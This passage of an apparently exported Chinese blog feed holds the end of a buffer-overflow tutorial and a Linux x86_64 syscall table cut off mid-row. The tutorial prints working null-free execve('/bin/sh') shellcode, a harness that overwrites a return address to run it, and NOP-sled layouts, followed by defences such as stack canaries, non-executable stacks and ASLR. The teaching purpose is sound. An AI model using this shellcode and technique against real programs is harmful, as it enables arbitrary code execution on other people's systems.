class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ gcc shellcode_test1.c -o shellcode_test1</span><br><span class="line">$ gdb shellcode_test1</span><br><span class="line">...</span><br><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000000005fa &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x00000000000005fb &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x00000000000005fe &lt;+4&gt;:jmp    0x62c &lt;main+50&gt;</span><br><span class="line">   0x0000000000000600 &lt;+6&gt;:pop    %rbx</span><br><span class="line">   0x0000000000000601 &lt;+7&gt;:mov    %rbx,0x8(%rsp)</span><br><span class="line">   0x0000000000000606 &lt;+12&gt;:xor    %rax,%rax</span><br><span class="line">   0x0000000000000609 &lt;+15&gt;:mov    %al,0x7(%rsp)</span><br><span class="line">   0x000000000000060d &lt;+19&gt;:mov    %eax,0x10(%rsp)</span><br><span class="line">   0x0000000000000611 &lt;+23&gt;:mov    <span class="variable">$0x3b</span>,%al</span><br><span class="line">   0x0000000000000613 &lt;+25&gt;:mov    %rbx,%rdi</span><br><span class="line">   0x0000000000000616 &lt;+28&gt;:lea    0x8(%rsp),%rsi</span><br><span class="line">   0x000000000000061b &lt;+33&gt;:lea    0x10(%rsp),%rdx</span><br><span class="line">   0x0000000000000620 &lt;+38&gt;:syscall </span><br><span class="line">   0x0000000000000622 &lt;+40&gt;:xor    %rdi,%rdi</span><br><span class="line">   0x0000000000000625 &lt;+43&gt;:xor    %rax,%rax</span><br><span class="line">   0x0000000000000628 &lt;+46&gt;:mov    <span class="variable">$0x3c</span>,%al</span><br><span class="line">   0x000000000000062a &lt;+48&gt;:syscall </span><br><span class="line">   0x000000000000062c &lt;+50&gt;:callq  0x600 &lt;main+6&gt;</span><br><span class="line">   0x0000000000000631 &lt;+55&gt;:(bad)  </span><br><span class="line">   0x0000000000000632 &lt;+56&gt;:(bad)  </span><br><span class="line">   0x0000000000000633 &lt;+57&gt;:imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br><span class="line">   0x000000000000063a &lt;+64&gt;:pop    %rbp</span><br><span class="line">   0x000000000000063b &lt;+65&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x /51xb main+4</span><br><span class="line">0x5fe &lt;main+4&gt;:0xeb0x2c0x5b0x480x890x5c0x240x08</span><br><span class="line">0x606 &lt;main+12&gt;:0x480x310xc00x880x440x240x070x89</span><br><span class="line">0x60e &lt;main+20&gt;:0x440x240x100xb00x3b0x480x890xdf</span><br><span class="line">0x616 &lt;main+28&gt;:0x480x8d0x740x240x080x480x8d0x54</span><br><span class="line">0x61e &lt;main+36&gt;:0x240x100x0f0x050x480x310xff0x48</span><br><span class="line">0x626 &lt;main+44&gt;:0x310xc00xb00x3c0x0f0x050xe80xcf</span><br><span class="line">0x62e &lt;main+52&gt;:0xff0xff0xff</span><br></pre></td></tr></table></figure><p>现在，我们的shellcode中已经没有0x00了，并且还变短了呢。</p><p>现在，我们试一试这个shellcode作为字符串能否运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shellcode.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x2c\x5b\x48\x89\x5c\x24\x08\x48\x31\xc0\x88\x44\x24\x07\x89\x44\x24"</span></span><br><span class="line">                   <span class="string">"\x10\xb0\x3b\x48\x89\xdf\x48\x8d\x74\x24\x08\x48\x8d\x54\x24\x10\x0f\x05"</span></span><br><span class="line">                   <span class="string">"\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xcf\xff\xff\xff/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  *ret;</span><br><span class="line">    ret = (<span class="keyword">long</span> *)&amp;ret + <span class="number">2</span>;</span><br><span class="line">    (*ret) = (<span class="keyword">long</span>)shellcode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -z execstack -fno-stack-protector -o shellcode shellcode.c</span><br><span class="line">$ ./shellcode</span><br><span class="line">sh-4.4<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>哈，完全可以运行。</p><h2 id="使用shellcode"><a href="#使用shellcode" class="headerlink" title="使用shellcode"></a>使用shellcode</h2><p>现在，我们已经有了shellcode，我们在前面也提供了一种攻击思路，但是最终的困难却在于我们该如何利用缓冲区溢出来修改返回地址，说实话，到现在为止，博主并没有找到一个优雅的、简单的修改返回地址的方法。在我所看的一些文章中，唯一的方法就是“试”，这当然还需要靠点运气，更何况现在操作系统一般采用栈随机化，并不好“试”。</p><p>一种比较好的方法是在shellcode前面加上许多<code>nop</code>指令，并在后面加上许多要覆盖的返回地址。由于<code>nop</code>代表空指令，且只占一个字节，不管我们的返回地址返回到shellcode前面的任何一个<code>nop</code>，程序都会执行到shellcode所在的地方，而不必非要返回到shellcode的开头处，这会大大增加shellcode被执行的机率。</p><img src="/images/缓冲区溢出5.jpg"><p>但是，这对一些比较小的缓冲区却并不是很适用，因为比较小的缓冲区并不能有太多了<code>nop</code>或者太长的shellcode，否则返回地址直接被shellcode或者甚至被nop给覆盖了，在别处看到的是，解决这类小缓冲区的方法也很简单，我们把返回地址放在前面，<code>nop</code>放在中间，shellcode放在最后面，就像这样：</p><img src="/images/缓冲区溢出6.jpg"><p>这样理论上，<code>nop</code>可以很多，执行shellcode的机会也会大大增加。</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>现代编译器已经加入了许多防范缓冲区溢出的机制，例如缓冲区溢出检查（还记的我前面卖的关子吗？我们使用了gcc的-fno-stack-protector参数，就是让编译器不要加入这种机制，以免干扰我们的实验。）、禁止栈内执行代码（shellcode.c编译时所用的-z execstack，该参数是允许栈内代码执行）。缓冲区溢出检查是指在栈上的局部变量分配之前，先分配一些空间保存某个数，当在程序返回之前，先检查这个数有没有被改变，若被改变了，则立即触发中断，防止去执行shellcode。另外，现代操作系统也加入了许多措施来阻止缓冲区溢出，比如栈的随机化（这又大大降低了我们“猜”中返回地址的机率）。</p><p>但是，尽管操作系统和编译器都加入了如此多的机制来防范缓冲区溢出，但是，攻击者总还是有种种办法绕过这些机制，所以，要从根本上杜绝缓冲区溢出，还是要从我们写程序入手，在对缓冲区操作前，一定要对其操作的范围进行限制，不要使用那些危险的函数，比如<code>gets</code>、不限制长度的<code>strcpy</code>等等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>程序依靠栈来执行，并将局部变量分配在栈上，<code>call</code>指令也将返回地址放在栈上，这是可以进行缓冲区溢出的前提。</p><p>缓冲区溢出是通过覆盖返回地址，进而去执行攻击程序（shellcode）来实现的。</p><p>shellcode编写完成后要转换为二进制（16进制）数据，且不得出现0x00，这代表了字符串的结束</p><p>防范缓冲区溢出要使用正确的编译选项，更重要的是正确的编写程序。</p><hr><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在现在的网络攻击中，缓冲区溢出方式的攻击占据了很大一部分，缓冲区溢出是一种非常普遍的漏洞，但同时，它也是非常危险的一种漏洞，轻则导致系统宕机
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
      <category term="信息安全" scheme="https://mingliangliu.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统调用表（x86_64）</title>
    <link href="https://mingliangliu.com/2019/09/02/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8%EF%BC%88x86-64%EF%BC%89/"/>
    <id>https://mingliangliu.com/2019/09/02/Linux系统调用表（x86-64）/</id>
    <published>2019-09-02T14:42:38.000Z</published>
    <updated>2019-09-02T15:11:26.465Z</updated>
    
    <content type="html"><![CDATA[<p>内核版本 Linux 4.7</p><p>Note:64位系统中，不再使用<code>int 0x80</code>来进行系统调用，取而代之的是<code>syscall</code>指令</p><table><thead><tr><th>%rax</th><th>System call</th><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%r10</th><th>%r8</th><th>%r9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>const char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>unsigned int fd</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>fconst char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>struct poll_fd *ufds</td><td>unsigned int nfds</td><td>long timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>unsigned long addr</td><td>unsigned long len</td><td>unsigned long prot</td><td>unsigned long flags</td><td>unsigned long fd</td><td>unsigned long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>unsigned long addr</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>unsigned long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>int sig</td><td>const struct sigaction *act</td><td>struct sigaction*oact</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>int how</td><td>sigset_t *nset</td><td>sigset_t *oset</td><td>size_tsigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>unsigned long fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>int *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set*exp</td><td>struct timeval*tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned longnew_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char *vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>unsigned long start</td><td>size_t len_in</td><td>int behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>key_t key</td><td>size_t size</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>unsigned int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>int which</td><td>struct itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>unsigned int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval*ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>int family</td><td>int type</td><td>int protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>int fd</td><td>struct sockaddr *uservaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>int fd</td><td>void *buff</td><td>size_t len</td><td>unsigned flags</td><td>structsockaddr *addr</td><td>int addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>int fd</td><td>void *ubuf</td><td>size_t size</td><td>unsigned flags</td><td>structsockaddr *addr</td><td>int *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>int fd</td><td>int how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>int fd</td><td>struct sokaddr *umyaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>int fd</td><td>int backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>int family</td><td>int type</td><td>int protocol</td><td>int *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>unsigned long clone_flags</td><td>unsigned long newsp</td><td>void*parent_tid</td><td>void *child_tid</td><td></td><td></td></tr><tr><td>57</td><td>sys_fork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char* const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>pid_t upid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>struct old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>union semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>char *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>key_t key</td><td>int msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>unsigned int fd</td><td>unsigned int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>const char *path</td><td>long length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>unsigned int fd</td><td>unsigned long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>char *buf</td><td>unsigned long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>unsigned int fd</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>int mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>int who</td><td>struct rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>int type</td><td>char *buf</td><td>int len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>pid_t pid</td><td>pid_t pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>uid_t ruid</td><td>uid_t euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>gid_t rgid</td><td>gid_t egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>const stack_t *uss</td><td>stack_t *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>char *filename</td><td>struct utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>unsigned int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>const char *pathname</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>unsigned int fd</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>int which</td><td>int who</td><td>int niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>pid_t pid</td><td>struct timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>int func</td><td>void *ptr</td><td>unsigned long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>const char *new_root</td><td>const char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>struct __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td></td><td>unsigned long 